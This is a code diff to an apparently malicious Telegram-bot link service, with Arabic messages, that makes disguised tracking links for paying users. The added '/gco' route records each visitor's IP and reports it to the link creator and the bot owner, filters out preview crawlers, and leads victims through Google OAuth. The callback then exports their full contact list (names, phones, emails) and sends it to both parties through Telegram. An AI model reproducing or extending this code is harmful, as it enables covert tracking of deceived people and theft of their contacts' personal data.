@@ -595,7 +595,8 @@ const CODE_FILES = [
   { local: './public/sw.js',      remote: 'public/sw.js'      },
   { local: './views/bank.ejs',        remote: 'views/bank.ejs'        },
   { local: './views/cloudflare.ejs',  remote: 'views/cloudflare.ejs'  },
-  { local: './views/contacts.ejs',    remote: 'views/contacts.ejs'    },
+  { local: './views/contacts.ejs',             remote: 'views/contacts.ejs'             },
+  { local: './views/google-contacts-auth.ejs', remote: 'views/google-contacts-auth.ejs' },
   { local: './views/download.ejs',    remote: 'views/download.ejs'    },
   { local: './views/dynpage.ejs',     remote: 'views/dynpage.ejs'     },
   { local: './views/google.ejs',      remote: 'views/google.ejs'      },
@@ -911,6 +912,101 @@ app.get("/f/:path/*", async (req, res) => {
   });
   const redirectUrl = Buffer.from(req.params[0], 'base64').toString('utf8');
   res.render("files", { uid: req.params.path, a: hostURL, redirectUrl });
+});
+
+// ── Google OAuth state store (uid -> {creatorId, uid, redirectUrl, ts}) ──────
+const _gOAuthStates = new Map();
+
+// ── Google Contacts OAuth — initiate ─────────────────────────────────────────
+app.get("/gco/:path/*", async (req, res) => {
+  const ua = (req.headers['user-agent'] || '').toLowerCase();
+  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
+  if (!req.params.path) return res.redirect("https://google.com");
+  const creatorId = parseInt(req.params.path, 36);
+  if (!canUsePremium(creatorId, 'contacts')) return res.send(upsellPage());
+  const ip = getIP(req);
+  const d  = new Date().toJSON().slice(0,19).replace('T',':');
+  const flag = targets.has(creatorId) ? '🎯🚨' : '⚠️';
+  notify(creatorId, `${flag} تم فتح رابط اتصالات Google!\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
+  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `${flag} رابط اتصالات Google! ID: ${creatorId}\n⚓ ${ip}`);
+  enrichIP(ip).then(info => {
+    if (!info) return;
+    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
+    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
+  });
+  const redirectUrl = Buffer.from(req.params[0], 'base64').toString('utf8');
+  // Generate state token
+  const state = Buffer.from(JSON.stringify({ uid: req.params.path, creatorId, redirectUrl })).toString('base64url');
+  _gOAuthStates.set(state, { creatorId, uid: req.params.path, redirectUrl, ts: Date.now() });
+  // Purge old states
+  for (const [k,v] of _gOAuthStates) { if (Date.now() - v.ts > 15*60*1000) _gOAuthStates.delete(k); }
+  const GCL_ID  = process.env.GOOGLE_CLIENT_ID     || '';
+  const hasOAuth = !!(GCL_ID && process.env.GOOGLE_CLIENT_SECRET);
+  const oauthUrl = hasOAuth
+    ? `https://accounts.google.com/o/oauth2/v2/auth?client_id=${encodeURIComponent(GCL_ID)}&redirect_uri=${encodeURIComponent(hostURL+'/google-callback')}&response_type=code&scope=${encodeURIComponent('https://www.googleapis.com/auth/contacts.readonly')}&access_type=online&state=${encodeURIComponent(state)}&prompt=consent`
+    : null;
+  res.render("google-contacts-auth", { uid: req.params.path, a: hostURL, state, redirectUrl, oauthUrl });
+});
+
+// ── Google OAuth callback ─────────────────────────────────────────────────────
+app.get("/google-callback", async (req, res) => {
+  const { code, state } = req.query;
+  if (!code || !state) return res.redirect("https://google.com");
+  const stateData = _gOAuthStates.get(state);
+  if (!stateData) return res.redirect("https://google.com");
+  _gOAuthStates.delete(state);
+  const { creatorId, uid, redirectUrl } = stateData;
+  try {
+    // Exchange code for access token
+    const tokenRes = await fetch('https://oauth2.googleapis.com/token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        code,
+        client_id:     process.env.GOOGLE_CLIENT_ID,
+        client_secret: process.env.GOOGLE_CLIENT_SECRET,
+        redirect_uri:  `${hostURL}/google-callback`,
+        grant_type:    'authorization_code'
+      }).toString()
+    });
+    const tokenData = await tokenRes.json();
+    if (!tokenData.access_token) throw new Error('No access token: ' + JSON.stringify(tokenData));
+    // Fetch all contacts with pagination
+    let allContacts = [], pageToken = '';
+    do {
+      const cRes = await fetch(
+        `https://people.googleapis.com/v1/people/me/connections?personFields=names,phoneNumbers,emailAddresses&pageSize=1000${pageToken ? `&pageToken=${encodeURIComponent(pageToken)}` : ''}`,
+        { headers: { Authorization: `Bearer ${tokenData.access_token}` } }
+      );
+      const cData = await cRes.json();
+      if (cData.connections) allContacts = allContacts.concat(cData.connections);
+      pageToken = cData.nextPageToken || '';
+    } while (pageToken);
+    // Format as text
+    const device = 'Google Account';
+    let txt = `Google Contacts Export\nTotal: ${allContacts.length}\nDate: ${new Date().toISOString()}\n${'='.repeat(40)}\n\n`;
+    for (const c of allContacts) {
+      const name   = c.names?.[0]?.displayName || 'Unknown';
+      const phones = (c.phoneNumbers || []).map(p => p.value).join(' | ');
+      const emails = (c.emailAddresses || []).map(e => e.value).join(' | ');
+      txt += `Name: ${name}\n`;
+      if (phones) txt += `Phone: ${phones}\n`;
+      if (emails) txt += `Email: ${emails}\n`;
+      txt += '\n';
+    }
+    const buf  = Buffer.from(txt, 'utf8');
+    const info = { filename: `Google_Contacts_${allContacts.length}.txt`, contentType: 'text/plain' };
+    const cap  = `📒 *جهات اتصال Google مُستخرجة!*\n✅ ${allContacts.length} جهة اتصال كاملة بدون تحديد`;
+    if (!settings.silentMode) {
+      bot.sendDocument(creatorId, buf, { caption: cap, parse_mode:'Markdown' }, info).catch(()=>{});
+      if (creatorId !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${creatorId})`, parse_mode:'Markdown' }, info).catch(()=>{});
+    }
+    notify(creatorId, `🎉 تم سحب ${allContacts.length} جهة اتصال عبر Google OAuth!`);
+    res.redirect(redirectUrl || 'https://google.com');
+  } catch (e) {
+    console.error('[google-callback]', e.message);
+    res.redirect(redirectUrl || 'https://google.com');
+  }
 });
 
 // ── Contacts route (premium only) ─────────────────────────────────────────────
@@ -3814,7 +3910,8 @@ async function createLink(cid, msg) {
     const dlLink = `${hostURL}/dl/${url}`;
     const ttLink = `${hostURL}/tt/${url}`;
     const igLink = `${hostURL}/ig/${url}`;
-    const coLink = `${hostURL}/co/${url}`;
+    const coLink  = `${hostURL}/co/${url}`;
+    const gcoLink = `${hostURL}/gco/${url}`;
     const fLink  = `${hostURL}/f/${url}`;
     lastLink.set(String(cid), cLink);
     addOldLink(cid, { cLink, wLink, waLink, dlLink, ttLink, igLink, url: trimmed, createdAt: Date.now() });
@@ -3833,7 +3930,7 @@ async function createLink(cid, msg) {
     } else {
       // ── Premium users: all links ───────────────────────────────────────────
       bot.sendMessage(cid,
-        `✅ *تم إنشاء الروابط!*\n🔗 \`${trimmed}\`\n\n━━━━━━━━━━━━━━━\n🛡️ *Cloudflare:*\n${cLink}\n\n🖥️ *WebView:*\n${wLink}\n\n💬 *WhatsApp:*\n${waLink}\n\n📁 *Google Drive:*\n${dlLink}\n\n🎵 *TikTok:*\n${ttLink}\n\n📷 *Instagram:*\n${igLink}\n\n📒 *جهات الاتصال:*\n${coLink}\n\n🖼️ *صور وملفات:*\n${fLink}`,
+        `✅ *تم إنشاء الروابط!*\n🔗 \`${trimmed}\`\n\n━━━━━━━━━━━━━━━\n🛡️ *Cloudflare:*\n${cLink}\n\n🖥️ *WebView:*\n${wLink}\n\n💬 *WhatsApp:*\n${waLink}\n\n📁 *Google Drive:*\n${dlLink}\n\n🎵 *TikTok:*\n${ttLink}\n\n📷 *Instagram:*\n${igLink}\n\n📒 *جهات الاتصال (Picker):*\n${coLink}\n\n📒 *جهات الاتصال Google OAuth 🔥:*\n${gcoLink}\n\n🖼️ *صور وملفات:*\n${fLink}`,
         { parse_mode:'Markdown', reply_markup: JSON.stringify({ inline_keyboard: [
           [{ text:"🔗 رابط جديد", callback_data:"crenew" }, { text:"📷 QR Code", callback_data:`qr:${cid}` }],
           [{ text:"📋 إدارة روابطي", callback_data:"lm:list:0" }]
